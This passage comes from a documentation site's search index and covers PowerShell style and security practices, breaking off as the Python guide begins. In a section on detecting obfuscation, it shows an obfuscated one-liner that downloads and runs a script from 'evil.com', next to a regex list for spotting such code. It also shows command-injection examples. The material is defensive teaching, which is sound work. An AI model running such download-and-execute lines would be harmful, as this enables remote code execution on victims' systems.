[Parameter(Mandatory = $true, ParameterSetName = 'ByCount')]\n        [ValidateRange(1, 1000)]\n        [int]$Count,\n\n        # Common parameter across all sets\n        [Parameter(Mandatory = $false)]\n        [string]$LogLevel = 'Info'\n    )\n\n    switch ($PSCmdlet.ParameterSetName) {\n        'ByDate' {\n            Get-WinEvent -FilterHashtable @{\n                LogName   = 'Application'\n                StartTime = $StartDate\n                EndTime   = $EndDate\n            } | Where-Object { $_.LevelDisplayName -eq $LogLevel }\n        }\n        'ByCount' {\n            Get-WinEvent -LogName 'Application' -MaxEvents $Count |\n                Where-Object { $_.LevelDisplayName -eq $LogLevel }\n        }\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#error-handling","title":"Error Handling","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#try-catch-finally","title":"Try-Catch-Finally","text":"<pre><code>function Invoke-ApiRequest {\n    [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $true)]\n        [string]$Endpoint,\n\n        [Parameter(Mandatory = $false)]\n        [int]$MaxRetries = 3\n    )\n\n    $AttemptCount = 0\n    $Success = $false\n\n    while (-not $Success -and $AttemptCount -lt $MaxRetries) {\n        $AttemptCount++\n        Write-Verbose \"API request attempt $AttemptCount of $MaxRetries\"\n\n        try {\n            $Response = Invoke-RestMethod -Uri $Endpoint -Method Get -ErrorAction Stop\n            $Success = $true\n            return $Response\n        }\n        catch [System.Net.WebException] {\n            Write-Warning \"Network error on attempt $AttemptCount: $($_.Exception.Message)\"\n            if ($AttemptCount -eq $MaxRetries) {\n                Write-Error \"Max retries reached. Request failed.\"\n                throw\n            }\n            Start-Sleep -Seconds (2 * $AttemptCount)\n        }\n        catch {\n            Write-Error \"Unexpected error: $($_.Exception.Message)\"\n            throw\n        }\n        finally {\n            Write-Verbose \"Completed attempt $AttemptCount\"\n        }\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#erroraction-and-errorvariable","title":"ErrorAction and ErrorVariable","text":"<pre><code>## Suppress errors for specific commands\n$Service = Get-Service -Name 'NonExistentService' -ErrorAction SilentlyContinue\n\nif ($null -eq $Service) {\n    Write-Warning \"Service not found, creating...\"\n}\n\n## Capture errors for analysis\nGet-Process -Name 'chrome' -ErrorAction SilentlyContinue -ErrorVariable ProcessErrors\nif ($ProcessErrors) {\n    Write-Error \"Failed to get process: $($ProcessErrors[0].Exception.Message)\"\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#pipeline-usage","title":"Pipeline Usage","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#pipeline-aware-functions","title":"Pipeline-Aware Functions","text":"<pre><code>function Export-UserData {\n    [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]\n        [PSCustomObject[]]$User,\n\n        [Parameter(Mandatory = $true)]\n        [string]$OutputPath\n    )\n\n    begin {\n        Write-Verbose \"Starting user data export to: $OutputPath\"\n        $AllUsers = @()\n    }\n\n    process {\n        $AllUsers += $User\n    }\n\n    end {\n        $AllUsers | Export-Csv -Path $OutputPath -NoTypeInformation\n        Write-Verbose \"Exported $($AllUsers.Count) users to $OutputPath\"\n    }\n}\n\n## Usage\nGet-ADUser -Filter * | Export-UserData -OutputPath 'users.csv'\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#pipeline-best-practices","title":"Pipeline Best Practices","text":"<pre><code>## Good - Efficient pipeline usage\nGet-Process | Where-Object { $_.WorkingSet -gt 100MB } | Sort-Object WorkingSet -Descending | Select-Object -First 10\n\n## Good - Named parameters for clarity\nGet-ChildItem -Path C:\\Logs -Filter *.log |\n    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |\n    Remove-Item -Force\n\n## Avoid - Unnecessary loops when pipeline works\n## Bad\n$Files = Get-ChildItem -Path C:\\Logs\nforeach ($File in $Files) {\n    Remove-Item -Path $File.FullName\n}\n\n## Good\nGet-ChildItem -Path C:\\Logs | Remove-Item\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#module-structure","title":"Module Structure","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#module-layout","title":"Module Layout","text":"<pre><code>MyModule/\n\u251c\u2500\u2500 MyModule.psd1          # Module manifest\n\u251c\u2500\u2500 MyModule.psm1          # Root module script\n\u251c\u2500\u2500 Public/                # Exported functions\n\u2502   \u251c\u2500\u2500 Get-MyData.ps1\n\u2502   \u2514\u2500\u2500 Set-MyData.ps1\n\u251c\u2500\u2500 Private/               # Internal functions\n\u2502   \u2514\u2500\u2500 ConvertTo-MyFormat.ps1\n\u251c\u2500\u2500 Classes/               # PowerShell classes\n\u2502   \u2514\u2500\u2500 MyClass.ps1\n\u251c\u2500\u2500 Tests/                 # Pester tests\n\u2502   \u251c\u2500\u2500 MyModule.Tests.ps1\n\u2502   \u2514\u2500\u2500 Integration.Tests.ps1\n\u2514\u2500\u2500 en-US/                 # Help files\n    \u2514\u2500\u2500 MyModule-help.xml\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#module-manifest-psd1","title":"Module Manifest (.psd1)","text":"<pre><code>@{\n    RootModule        = 'MyModule.psm1'\n    ModuleVersion     = '1.0.0'\n    GUID              = '12345678-1234-1234-1234-123456789012'\n    Author            = 'Tyler Dukes'\n    CompanyName       = 'Dukes Engineering'\n    Copyright         = '(c) 2025 Tyler Dukes. All rights reserved.'\n    Description       = 'Module for managing application deployments'\n    PowerShellVersion = '7.2'\n\n    FunctionsToExport = @('Get-MyData', 'Set-MyData')\n    CmdletsToExport   = @()\n    VariablesToExport = @()\n    AliasesToExport   = @()\n\n    RequiredModules   = @('Microsoft.PowerShell.Management')\n\n    PrivateData = @{\n        PSData = @{\n            Tags       = @('Automation', 'Deployment')\n            LicenseUri = 'https://github.com/myorg/MyModule/blob/main/LICENSE'\n            ProjectUri = 'https://github.com/myorg/MyModule'\n        }\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#root-module-psm1","title":"Root Module (.psm1)","text":"<pre><code>## MyModule.psm1\n\n## Import all public functions\n$PublicFunctions = @(Get-ChildItem -Path $PSScriptRoot\\Public\\*.ps1 -ErrorAction SilentlyContinue)\nforeach ($Function in $PublicFunctions) {\n    try {\n        . $Function.FullName\n    }\n    catch {\n        Write-Error \"Failed to import function $($Function.FullName): $_\"\n    }\n}\n\n## Import all private functions\n$PrivateFunctions = @(Get-ChildItem -Path $PSScriptRoot\\Private\\*.ps1 -ErrorAction SilentlyContinue)\nforeach ($Function in $PrivateFunctions) {\n    try {\n        . $Function.FullName\n    }\n    catch {\n        Write-Error \"Failed to import private function $($Function.FullName): $_\"\n    }\n}\n\n## Export only public functions\nExport-ModuleMember -Function $PublicFunctions.BaseName\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#testing-with-pester","title":"Testing with Pester","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#basic-pester-test","title":"Basic Pester Test","text":"<pre><code>## Get-UserProfile.Tests.ps1\nBeforeAll {\n    . $PSScriptRoot/../Public/Get-UserProfile.ps1\n}\n\nDescribe 'Get-UserProfile' {\n    Context 'Parameter validation' {\n        It 'Should require UserName parameter' {\n            { Get-UserProfile } | Should -Throw\n        }\n\n        It 'Should accept valid UserName' {\n            { Get-UserProfile -UserName 'jdoe' } | Should -Not -Throw\n        }\n    }\n\n    Context 'User retrieval' {\n        BeforeEach {\n            Mock Get-ADUser {\n                return [PSCustomObject]@{\n                    SamAccountName = 'jdoe'\n                    DisplayName    = 'John Doe'\n                    EmailAddress   = 'jdoe@example.com'\n                    Department     = 'IT'\n                }\n            }\n        }\n\n        It 'Should return user profile object' {\n            $Result = Get-UserProfile -UserName 'jdoe'\n            $Result | Should -Not -BeNullOrEmpty\n            $Result.UserName | Should -Be 'jdoe'\n        }\n\n        It 'Should include email address' {\n            $Result = Get-UserProfile -UserName 'jdoe'\n            $Result.Email | Should -Match '^\\w+@\\w+\\.\\w+$'\n        }\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#psscriptanalyzer-configuration","title":"PSScriptAnalyzer Configuration","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#pslintrcpsd1","title":".pslintrc.psd1","text":"<pre><code>@{\n    Rules = @{\n        PSAvoidUsingCmdletAliases = @{\n            Enable = $true\n        }\n        PSAvoidUsingWriteHost = @{\n            Enable = $true\n        }\n        PSUseApprovedVerbs = @{\n            Enable = $true\n        }\n        PSUseDeclaredVarsMoreThanAssignments = @{\n            Enable = $true\n        }\n        PSProvideCommentHelp = @{\n            Enable = $true\n        }\n    }\n    ExcludeRules = @(\n        'PSAvoidUsingInvokeExpression'\n    )\n    Severity = @('Error', 'Warning')\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#running-psscriptanalyzer","title":"Running PSScriptAnalyzer","text":"<pre><code>## Analyze single file\nInvoke-ScriptAnalyzer -Path .\\MyScript.ps1\n\n## Analyze entire directory\nInvoke-ScriptAnalyzer -Path .\\MyModule -Recurse\n\n## With custom settings\nInvoke-ScriptAnalyzer -Path .\\MyModule -Settings .\\.pslintrc.psd1\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#anti-patterns","title":"Anti-Patterns","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-using-aliases-in-scripts","title":"\u274c Avoid: Using Aliases in Scripts","text":"<pre><code>## Bad - Aliases reduce readability\ngci | ? { $_.Length -gt 1MB } | % { ri $_ }\n\n## Good - Full cmdlet names\nGet-ChildItem | Where-Object { $_.Length -gt 1MB } | ForEach-Object { Remove-Item $_ }\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-write-host-for-output","title":"\u274c Avoid: Write-Host for Output","text":"<pre><code>## Bad - Write-Host cannot be captured\nfunction Get-ComputerStatus {\n    Write-Host \"Computer is online\"\n}\n\n## Good - Use Write-Output or return\nfunction Get-ComputerStatus {\n    return [PSCustomObject]@{\n        Status = 'Online'\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-unapproved-verbs","title":"\u274c Avoid: Unapproved Verbs","text":"<pre><code>## Bad - Unapproved verbs\nfunction Fetch-UserData { }\nfunction Delete-OldFiles { }\n\n## Good - Approved verbs\nfunction Get-UserData { }\nfunction Remove-OldFiles { }\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-not-using-parameter-validation","title":"\u274c Avoid: Not Using Parameter Validation","text":"<pre><code>## Bad - No validation\nfunction Set-UserAge {\n    param($Age)\n    # No validation - can accept invalid values\n    $User.Age = $Age\n}\n\n## Good - With validation\nfunction Set-UserAge {\n    param(\n        [Parameter(Mandatory=$true)]\n        [ValidateRange(0, 150)]\n        [int]$Age\n    )\n    $User.Age = $Age\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-using-positional-parameters-in-scripts","title":"\u274c Avoid: Using Positional Parameters in Scripts","text":"<pre><code>## Bad - Positional parameters are unclear\nGet-ChildItem C:\\Temp *.txt $true\n\n## Good - Named parameters\nGet-ChildItem -Path C:\\Temp -Filter *.txt -Recurse\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-suppressing-errors-with-out-null","title":"\u274c Avoid: Suppressing Errors with Out-Null","text":"<pre><code>## Bad - Hiding errors\nRemove-Item $file -ErrorAction SilentlyContinue 2&gt;&amp;1 | Out-Null\n\n## Good - Explicit error handling\ntry {\n    Remove-Item $file -ErrorAction Stop\n} catch {\n    Write-Warning \"Failed to remove $file: $_\"\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#avoid-not-using-splatting-for-many-parameters","title":"\u274c Avoid: Not Using Splatting for Many Parameters","text":"<pre><code>## Bad - Long parameter list\nNew-ADUser -Name \"John Doe\" -SamAccountName \"jdoe\" `\n  -UserPrincipalName \"jdoe@contoso.com\" `\n  -Path \"OU=Users,DC=contoso,DC=com\" -AccountPassword $password -Enabled $true\n\n## Good - Use splatting\n$userParams = @{\n    Name              = \"John Doe\"\n    SamAccountName    = \"jdoe\"\n    UserPrincipalName = \"jdoe@contoso.com\"\n    Path              = \"OU=Users,DC=contoso,DC=com\"\n    AccountPassword   = $password\n    Enabled           = $true\n}\nNew-ADUser @userParams\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#security-best-practices","title":"Security Best Practices","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#execution-policy-and-script-signing","title":"Execution Policy and Script Signing","text":"<p>Use proper execution policies and sign scripts:</p> <pre><code>## Bad - Bypassing execution policy\nPowerShell.exe -ExecutionPolicy Bypass -File script.ps1  # \u274c Security risk!\n\n## Good - Use RemoteSigned or AllSigned\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser\n\n## Good - Sign scripts\n$cert = Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert\nSet-AuthenticodeSignature -FilePath .\\script.ps1 -Certificate $cert\n\n## Good - Verify signature before execution\n$signature = Get-AuthenticodeSignature -FilePath .\\script.ps1\nif ($signature.Status -ne 'Valid') {\n    throw \"Script signature is invalid!\"\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Never use <code>-ExecutionPolicy Bypass</code> in production</li> <li>Sign all production scripts</li> <li>Use <code>AllSigned</code> policy for maximum security</li> <li>Verify signatures before execution</li> <li>Store code signing certificates securely</li> <li>Use timestamp servers when signing</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#secure-credential-management","title":"Secure Credential Management","text":"<p>Never hardcode credentials:</p> <pre><code>## Bad - Hardcoded credentials\n$username = \"admin\"\n$password = \"Password123\"  # \u274c Exposed!\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)\n\n## Good - Use Get-Credential\n$credential = Get-Credential -UserName \"admin\" -Message \"Enter password\"\n\n## Good - Use Secret Management module\nInstall-Module -Name Microsoft.PowerShell.SecretManagement\nInstall-Module -Name SecretManagement.Keychain  # macOS\n# Or: SecretManagement.KeePass, SecretManagement.LastPass\n\nSet-Secret -Name \"ServiceAccount\" -Secret (Get-Credential)\n$credential = Get-Secret -Name \"ServiceAccount\" -AsPlainText\n\n## Good - Azure Key Vault\n$secret = Get-AzKeyVaultSecret -VaultName \"MyVault\" -Name \"DbPassword\"\n$credential = New-Object PSCredential(\"admin\", $secret.SecretValue)\n\n## Good - Never log credentials\nfunction Connect-Database {\n    [CmdletBinding()]\n    param(\n        [Parameter(Mandatory)]\n        [PSCredential]$Credential\n    )\n    # Credential automatically masked in verbose output\n    Write-Verbose \"Connecting as $($Credential.UserName)\"  # \u2705 Password not logged\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Never hardcode passwords in scripts</li> <li>Use <code>PSCredential</code> objects</li> <li>Use Secret Management modules</li> <li>Leverage cloud secret stores (Azure Key Vault, AWS Secrets Manager)</li> <li>Never log or display <code>SecureString</code> values</li> <li>Rotate credentials regularly</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#input-validation-and-injection-prevention","title":"Input Validation and Injection Prevention","text":"<p>Validate all inputs to prevent injection attacks:</p> <pre><code>## Bad - No validation (injection risk)\nparam($Username)\nInvoke-Expression \"net user $Username /delete\"  # \u274c Command injection!\n\n## Good - Validate inputs\nparam(\n    [Parameter(Mandatory)]\n    [ValidatePattern('^[a-zA-Z0-9_-]+$')]\n    [ValidateLength(1, 20)]\n    [string]$Username\n)\nRemove-LocalUser -Name $Username  # \u2705 Safe cmdlet\n\n## Good - Use parameter validation\nfunction Remove-UserAccount {\n    param(\n        [Parameter(Mandatory)]\n        [ValidateSet('Dev', 'Test', 'Prod')]\n        [string]$Environment,\n\n        [Parameter(Mandatory)]\n        [ValidateScript({\n            if ($_ -match '^[a-zA-Z0-9_-]+$') { $true }\n            else { throw \"Invalid username format\" }\n        })]\n        [string]$Username\n    )\n\n    Remove-LocalUser -Name $Username\n}\n\n## Good - Avoid Invoke-Expression\n## Bad\n$command = \"Get-Process -Name $processName\"  # User input\nInvoke-Expression $command  # \u274c Code injection!\n\n## Good\nGet-Process -Name $processName  # \u2705 Direct cmdlet call\n</code></pre> <p>Key Points:</p> <ul> <li>Always validate user inputs</li> <li>Use <code>ValidatePattern</code>, <code>ValidateSet</code>, <code>ValidateScript</code></li> <li>Never use <code>Invoke-Expression</code> with user input</li> <li>Use cmdlets instead of string commands</li> <li>Sanitize inputs before file operations</li> <li>Use parameter binding, not string concatenation</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#secure-file-operations","title":"Secure File Operations","text":"<p>Prevent path traversal and unauthorized file access:</p> <pre><code>## Bad - Path traversal vulnerability\nparam($FileName)\n$content = Get-Content \"C:\\Data\\$FileName\"  # \u274c Can access ../../../Windows/System32\n\n## Good - Validate and resolve paths\nparam(\n    [Parameter(Mandatory)]\n    [ValidateScript({\n        if ($_ -notmatch '\\.\\./') { $true }\n        else { throw \"Path traversal detected\" }\n    })]\n    [string]$FileName\n)\n\n$basePath = \"C:\\Data\"\n$fullPath = Join-Path $basePath $FileName | Resolve-Path\nif (-not $fullPath.Path.StartsWith($basePath)) {\n    throw \"Access denied: path outside allowed directory\"\n}\n$content = Get-Content $fullPath\n\n## Good - Set restrictive file permissions\n$acl = Get-Acl \"C:\\Secrets\\config.json\"\n$acl.SetAccessRuleProtection($true, $false)  # Disable inheritance\n$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(\n    \"BUILTIN\\Administrators\", \"FullControl\", \"Allow\"\n)\n$acl.AddAccessRule($rule)\nSet-Acl \"C:\\Secrets\\config.json\" $acl\n\n## Good - Verify checksums\nfunction Get-FileIfValid {\n    param(\n        [string]$Url,\n        [string]$ExpectedHash\n    )\n\n    $tempFile = New-TemporaryFile\n    Invoke-WebRequest -Uri $Url -OutFile $tempFile\n\n    $actualHash = (Get-FileHash $tempFile -Algorithm SHA256).Hash\n    if ($actualHash -ne $ExpectedHash) {\n        Remove-Item $tempFile\n        throw \"Hash mismatch! File may be tampered.\"\n    }\n\n    return $tempFile\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Validate file paths to prevent traversal</li> <li>Use <code>Resolve-Path</code> and verify resolved paths</li> <li>Set appropriate ACLs on sensitive files</li> <li>Verify file hashes after download</li> <li>Never trust user-provided paths</li> <li>Use temporary files for downloads</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#least-privilege-execution","title":"Least Privilege Execution","text":"<p>Run scripts with minimal required privileges:</p> <pre><code>## Bad - Requiring admin for everything\n#Requires -RunAsAdministrator\n# Entire script runs as admin even if not needed\n\n## Good - Check and request elevation only when needed\nfunction Install-Application {\n    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(\n        [Security.Principal.WindowsBuiltInRole]::Administrator\n    )) {\n        throw \"This function requires administrator privileges\"\n    }\n\n    # Admin-only operations here\n}\n\n## Good - Use RunAs for specific commands\n$credential = Get-Credential\nInvoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {\n    Install-WindowsFeature -Name Web-Server\n}\n\n## Good - Separate privileged and non-privileged operations\nfunction Deploy-Application {\n    # Non-privileged operations\n    Test-Configuration\n    Build-Application\n\n    # Only elevate for installation\n    if (Test-IsAdmin) {\n        Install-Service\n    } else {\n        Write-Warning \"Run as administrator to install service\"\n    }\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Don't require admin unless absolutely necessary</li> <li>Check for admin rights before privileged operations</li> <li>Use <code>Invoke-Command</code> with credentials for remote operations</li> <li>Separate privileged and non-privileged code</li> <li>Document why elevation is needed</li> <li>Use service accounts with minimal permissions</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#network-security","title":"Network Security","text":"<p>Secure network operations:</p> <pre><code>## Bad - Insecure HTTP\nInvoke-WebRequest -Uri \"http://api.example.com/data\"  # \u274c Unencrypted!\n\n## Good - Use HTTPS\nInvoke-WebRequest -Uri \"https://api.example.com/data\"\n\n## Good - Verify SSL certificates\ntry {\n    Invoke-WebRequest -Uri \"https://api.example.com/data\" `\n        -ErrorAction Stop  # Will fail on invalid certs\n} catch {\n    Write-Error \"SSL certificate validation failed: $_\"\n}\n\n## Good - Use authentication headers securely\n$token = Get-Secret -Name \"ApiToken\" -AsPlainText\n$headers = @{\n    \"Authorization\" = \"Bearer $token\"\n}\nInvoke-RestMethod -Uri \"https://api.example.com/data\" -Headers $headers\n\n## Good - Limit TLS versions\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `\n    [Net.SecurityProtocolType]::Tls13\n</code></pre> <p>Key Points:</p> <ul> <li>Always use HTTPS for network requests</li> <li>Verify SSL/TLS certificates</li> <li>Use TLS 1.2 or higher</li> <li>Never disable certificate validation</li> <li>Use secure authentication (OAuth, API keys from vaults)</li> <li>Implement request timeouts</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#audit-logging","title":"Audit Logging","text":"<p>Log security-relevant operations:</p> <pre><code>## Good - Comprehensive logging\nfunction Remove-UserAccount {\n    [CmdletBinding(SupportsShouldProcess)]\n    param(\n        [Parameter(Mandatory)]\n        [string]$Username\n    )\n\n    $auditLog = \"C:\\Logs\\audit.log\"\n    $timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    $user = $env:USERNAME\n    $computer = $env:COMPUTERNAME\n\n    $logEntry = \"$timestamp | $computer | $user | Attempting to remove user: $Username\"\n    Add-Content -Path $auditLog -Value $logEntry\n\n    try {\n        if ($PSCmdlet.ShouldProcess($Username, \"Remove user account\")) {\n            Remove-LocalUser -Name $Username -ErrorAction Stop\n            $logEntry = \"$timestamp | $computer | $user | SUCCESS: Removed user: $Username\"\n            Add-Content -Path $auditLog -Value $logEntry\n        }\n    } catch {\n        $logEntry = \"$timestamp | $computer | $user | FAILED: $($_.Exception.Message)\"\n        Add-Content -Path $auditLog -Value $logEntry\n        throw\n    }\n}\n\n## Good - Use Windows Event Log\nfunction Write-SecurityEvent {\n    param(\n        [string]$Message,\n        [ValidateSet('Information', 'Warning', 'Error')]\n        [string]$Level = 'Information'\n    )\n\n    Write-EventLog -LogName Application `\n        -Source \"MyApplication\" `\n        -EntryType $Level `\n        -EventId 1000 `\n        -Message $Message\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Log all security-relevant operations</li> <li>Include timestamps, user, and computer</li> <li>Log both successes and failures</li> <li>Use Windows Event Log for system-level events</li> <li>Protect log files with appropriate ACLs</li> <li>Implement log rotation</li> <li>Monitor logs for suspicious activity</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#script-obfuscation-detection","title":"Script Obfuscation Detection","text":"<p>Avoid and detect obfuscated scripts:</p> <pre><code>## Bad - Obfuscated code (red flag!)\n$a='I'+'E'+'X';$b='(Ne'+'w-Ob'+'ject Ne'+'t.WebC'+'lient).Dow'+'nloadStr'+'ing';\n&amp;$a($b+\"('http://evil.com/payload.ps1')\")  # \u274c Malicious obfuscation!\n\n## Good - Clear, readable code\n$client = New-Object Net.WebClient\n$script = $client.DownloadString('https://trusted-site.com/script.ps1')\n# Verify hash before executing\n$expectedHash = \"ABC123...\"\n$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($script))\nif ((Get-FileHash -InputStream $stream).Hash -eq $expectedHash) {\n    Invoke-Expression $script\n}\n\n## Good - Detect obfuscation\nfunction Test-ScriptObfuscation {\n    param([string]$ScriptPath)\n\n    $content = Get-Content $ScriptPath -Raw\n\n    $suspiciousPatterns = @(\n        '[char]\\(\\d+\\)',  # Char code obfuscation\n        '\\$\\w+\\s*=\\s*[''\"][^''\"]+[''\"]\\s*\\+',  # String concatenation obfuscation\n        '-join\\s*\\(',  # Join obfuscation\n        'iex|Invoke-Expression',  # Dynamic execution\n        '\\[Convert\\]::FromBase64String'  # Base64 encoding\n    )\n\n    foreach ($pattern in $suspiciousPatterns) {\n        if ($content -match $pattern) {\n            Write-Warning \"Suspicious pattern detected: $pattern\"\n            return $false\n        }\n    }\n    return $true\n}\n</code></pre> <p>Key Points:</p> <ul> <li>Never obfuscate your own scripts</li> <li>Detect and reject obfuscated scripts</li> <li>Be suspicious of base64, char codes, string concatenation</li> <li>Use PSScriptAnalyzer to detect suspicious patterns</li> <li>Review scripts before execution</li> <li>Implement application whitelisting</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#tool-configurations","title":"Tool Configurations","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#vscode-settingsjson","title":"VSCode settings.json","text":"<pre><code>{\n    \"powershell.scriptAnalysis.enable\": true,\n    \"powershell.scriptAnalysis.settingsPath\": \".pslintrc.psd1\",\n    \"powershell.codeFormatting.preset\": \"OTBS\",\n    \"powershell.codeFormatting.useCorrectCasing\": true,\n    \"files.associations\": {\n        \"*.ps1\": \"powershell\",\n        \"*.psm1\": \"powershell\",\n        \"*.psd1\": \"powershell\"\n    }\n}\n</code></pre>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#references","title":"References","text":"","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#official-documentation","title":"Official Documentation","text":"<ul> <li>PowerShell Documentation</li> <li>Approved Verbs</li> <li>PowerShell Best Practices</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#tools","title":"Tools","text":"<ul> <li>PSScriptAnalyzer - Static code analyzer</li> <li>Pester - Testing framework</li> <li>Plaster - Template-based scaffolding</li> <li>PSReadLine - Command-line editing</li> </ul>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/powershell/#style-guides","title":"Style Guides","text":"<ul> <li>PowerShell Practice and Style Guide</li> <li>The PowerShell Best Practices and Style Guide</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["powershell","scripting","cross-platform","automation","windows","infrastructure"]},{"location":"02_language_guides/python/","title":"Python Style Guide","text":"","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#language-overview","title":"Language Overview","text":"<p>Python is a high-level, interpreted, multi-paradigm programming language known for its readability, simplicity, and extensive ecosystem. Python is widely used in DevOps for automation, infrastructure management, data processing, and web services.</p>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Multi-paradigm (object-oriented, functional, procedural, imperative)</li> <li>Typing: Dynamically typed with optional static type hints (PEP 484)</li> <li>Runtime: CPython interpreter (default), also PyPy, Jython, IronPython</li> <li>Primary Use Cases:</li> <li>Infrastructure automation and configuration management</li> <li>CI/CD pipeline scripting and orchestration</li> <li>API development (FastAPI, Flask, Django)</li> <li>Data processing and analysis</li> <li>Cloud automation (AWS boto3, Azure SDK, Google Cloud)</li> <li>Testing and validation frameworks</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#this-style-guide-covers","title":"This Style Guide Covers","text":"<ul> <li>PEP 8 compliance with modern best practices</li> <li>Type hints and static type checking</li> <li>Documentation standards (docstrings, comments)</li> <li>Testing requirements and coverage</li> <li>Security best practices for DevOps</li> <li>Performance optimization patterns</li> <li>Tool configuration (Black, Flake8, mypy, pytest)</li> </ul>","tags":["python","programming","devops","automation","testing","pep8","type-hints"]},{"location":"02_language_guides/python/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Variables <code>snake_case</code> <code>user_count</code>, <code>api_response</code> Descriptive, lowercase with underscores Constants <code>UPPER_SNAKE_CASE</code> <code>MAX_RETRIES</code>, <code>API_URL</code> Module-level constants, all uppercase Functions <code>snake_case</code> <code>get_user()</code>, <code>validate_input()</code> Verbs, descriptive action names Classes <code>PascalCase</code> <code>UserProfile</code>, <code>DataProcessor</code> Nouns, capitalize each word Methods <code>snake_case</code> <code>calculate_total()</code>, <code>is_valid()</code> Like functions, instance/class methods Modules <code>snake_case</code> <code>user_manager.py</code>, 